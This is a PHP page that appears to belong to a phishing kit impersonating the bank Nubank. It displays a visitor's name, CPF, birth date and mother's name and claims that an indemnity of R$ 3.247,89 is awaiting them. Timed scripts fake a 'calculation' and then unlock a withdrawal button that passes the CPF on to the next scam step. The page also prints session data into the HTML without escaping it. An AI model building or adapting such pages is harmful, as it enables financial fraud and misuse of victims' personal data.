<?php
session_start();

$nome = $_SESSION['nome'] ?? '';
$cpf = $_SESSION['cpf'] ?? '';
$nascimento = $_SESSION['nascimento'] ?? '';
$mae = $_SESSION['mae'] ?? 'Não informado';
?>


<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" crossorigin="" type="font/woff2">
  <link rel="stylesheet" href="css/4c531af09e53964b.css" data-precedence="next">
  <link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-16e1aae0254933fa.js">
  <script src="js/4bd1b696-dd67615fb2881107.js" async=""></script>
  <script src="js/684-7ad13f0f08a97e29.js" async=""></script>
  <script src="js/main-app-770f509432689459.js" async=""></script>
  <script src="js/635-1aa044f5e9636678.js" async=""></script>
  <script src="js/604-fd8116797c061241.js" async=""></script>
  <script src="js/layout-57d92b1f1f9773b4.js" async=""></script>
  <script src="js/152-dd7f353a7fe905df.js" async=""></script>
  <script src="js/page-4f51e00f0b3e1647.js" async=""></script>
  <link rel="preload" href="https://cdn.utmify.com.br/scripts/utms/latest.js" as="script">
  <meta name="next-size-adjust" content="">
  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="16x16">
  <script src="js/polyfills-42372ed130431b0a.js" nomodule=""></script>
  <script src="https://cdn.tailwindcss.com"></script>

</head>

<body class="__className_d65c78 flex flex-col min-h-screen bg-slate-50 vsc-initialized" cz-shortcut-listen="true">
  <header class="bg-white p-2 shadow-sm">
    <div class="container mx-auto"><img alt="Logo placeholder" loading="lazy" width="900" height="900" decoding="async"
        data-nimg="1" class="h-10 w-auto" style="color:transparent" src="images/logo.webp"></div>
  </header>
  <nav class="w-full">
    <div class="w-full grid grid-cols-3 h-12 bg-white rounded-none border-b">
      <div class="
  flex items-center justify-center text-xs h-full
  text-gray-500
  transition-colors
  cursor-default select-none
">Verificar</div>
      <div class="
  flex items-center justify-center text-xs h-full
  text-[#041F55] border-b-2 border-blue-900 bg-[#E6E6E6]
  transition-colors
  cursor-default select-none
">Constultando</div>
      <div class="
  flex items-center justify-center text-xs h-full
  text-gray-500
  transition-colors
  cursor-default select-none
">Saque</div>
    </div>
  </nav>
  <main class="flex-grow">

    <div class="p-2">
      <div data-slot="card"
        class="bg-card text-card-foreground flex flex-col gap-6 rounded-xl border py-6 shadow-sm w-full max-w-md overflow-hidden">
        <div class="px-6 space-y-4">
          <div class="space-y-2">
            <h1 class="text-base font-bold text-[#041F55]">Atenção! Estamos calculando sua indenização</h1>
            <p class="text-sm text-gray-700">Enquanto estamos verificando o valor que você possui a receber, aguarde
              assistindo o vídeo abaixo</p>
          </div>
          <div aria-valuemax="100" aria-valuemin="0" role="progressbar" data-state="determinate" data-max="100"
            data-slot="progress"
            class="relative w-full overflow-hidden rounded-full h-2 bg-gray-200 [&>div]:bg-[#041F55]">
            <div id="barra-progresso" data-slot="progress-indicator"
              class="bg-primary h-full w-0 transition-all duration-200"></div>
          </div>

          <div class="relative aspect-video w-full overflow-hidden rounded-md">
            <div class="rounded-lg overflow-hidden" style="margin: 0px auto; width: 100%;">
              <div id="vid_67f48cbf8b469a116a7723b0" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img
                  id="thumb_67f48cbf8b469a116a7723b0"
                  src="https://images.converteai.net/78487274-be91-4954-af86-84a3a16bf411/players/67f48cbf8b469a116a7723b0/thumbnail.jpg"
                  style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;"
                  alt="thumbnail">
                <div id="backdrop_67f48cbf8b469a116a7723b0"
                  style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; ">
                </div>
              </div>
              <script type="text/javascript"
                id="scr_67f48cbf8b469a116a7723b0"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/78487274-be91-4954-af86-84a3a16bf411/players/67f48cbf8b469a116a7723b0/player.js", s.async = !0, document.head.appendChild(s); </script>
            </div>
          </div>
          <div class="flex justify-center max-w-96">
            <a id="botao-saque" onclick="redirect(event)"
              class="hidden inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive shadow-xs hover:bg-primary/90 h-9 has-[>svg]:px-3 bg-[#041F55] text-white w-full font-medium py-6 px-16">
              Sacar minha indenização
            </a>
          </div>
          <script>
            setTimeout(() => {
              document.getElementById('botao-saque').classList.remove('hidden')
            }, 120000)

            function redirect(event) {
              event.preventDefault()
              const urlParams = window.location.search
              const cpf = "<?= urlencode($cpf) ?>"
              const connector = urlParams.includes('?') ? '&' : '?'
              window.location.href = "../resultado" + urlParams + connector + "cpf=" + cpf
            }

            const barra = document.getElementById('barra-progresso')
            const duracao = 135000
            const inicio = Date.now()

            const animar = setInterval(() => {
              const agora = Date.now()
              const tempoDecorrido = agora - inicio
              const progresso = Math.min(tempoDecorrido / duracao, 1)
              barra.style.width = (progresso * 100) + '%'
              if (progresso === 1) clearInterval(animar)
            }, 200)
          </script>




          <div class="pt-2">
            <h2 class="text-base font-bold text-[#041F55] mb-4">Sua conta Nubank foi identificada!</h2>
            <div class="space-y-3 text-sm">
              <div class="flex items-center gap-3">
                <div><img alt="Nome" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="size-5"
                    src="images/pessoa.svg" style="color: transparent;"></div>
                <div><span class="font-semibold text-[#041F55]">Nome:</span>
                  <?= $nome ?>
                </div>
              </div>
              <div class="flex items-center gap-3">
                <div><img alt="CPF" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="size-5"
                    src="images/cpf.svg" style="color: transparent;"></div>
                <div><span class="font-semibold text-[#041F55]">CPF:</span>
                  <?= $cpf ?>
                </div>
              </div>
              <div class="flex items-center gap-3">
                <div><img alt="Nascimento" loading="lazy" width="16" height="16" decoding="async" data-nimg="1"
                    class="size-5" src="images/nascimento.svg" style="color: transparent;"></div>
                <div><span class="font-semibold text-[#041F55]">Data de Nascimento:</span>
                  <?= $nascimento ?>
                </div>
              </div>
              <div class="flex items-center gap-3">
                <div><img alt="Mãe" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="size-5"
                    src="images/mae.svg" style="color: transparent;"></div>
                <div><span class="font-semibold text-[#041F55]">Mãe:</span>
                  <?= $mae ?>
                </div>
              </div>

              <div id="valor-status" class="flex items-center gap-3">
                <div>
                  <img alt="Valor" loading="lazy" width="16" height="16" decoding="async" data-nimg="1" class="size-5"
                    src="images/valor.svg" style="color: transparent;">
                </div>
                <div>
                  <span class="font-semibold text-[#041F55] flex gap-1">
                    <span> Calculando sua indenização</span>
                    <div class="size-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
                  </span>
                </div>
              </div>
              <script>
                setTimeout(() => {
                  document.getElementById('valor-status').innerHTML = `
                    <div><img alt="Valor" loading="lazy" width="16" height="16" decoding="async" data-nimg="1"
                      class="size-5" style="color:transparent" src="images/valor.svg"></div>
                    <div>
                      <p class="font-semibold text-[#041F55]">
                        Valor disponível: <span class="text-black">R$&nbsp;3.247,89</span>
                      </p>
                    </div>
                  `
                }, 120000)
              </script>


            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
  <footer class="mt-auto bg-[#041F55] text-white p-4 pt-1">
    <div class="mx-auto space-y-2">
      <div class="flex justify-center items-center"><img alt="Footer logo placeholder" loading="lazy" width="200"
          height="50" decoding="async" data-nimg="1" class="h-20 w-auto" style="color:transparent"
          src="images/logo-branca.webp"><img alt="Footer logo placeholder" loading="lazy" width="200" height="50"
          decoding="async" data-nimg="1" class="h-9 w-auto" style="color:transparent" src="images/nubank-logo.webp">
      </div>
      <div data-orientation="horizontal" role="none" data-slot="separator-root"
        class="bg-border shrink-0 data-[orientation=horizontal]:h-px data-[orientation=horizontal]:w-full data-[orientation=vertical]:h-full data-[orientation=vertical]:w-px text-white">
      </div>
      <div class="text-center text-xs">Política de privacidade e Termos de Uso</div>
    </div>
  </footer>

</body>

</html>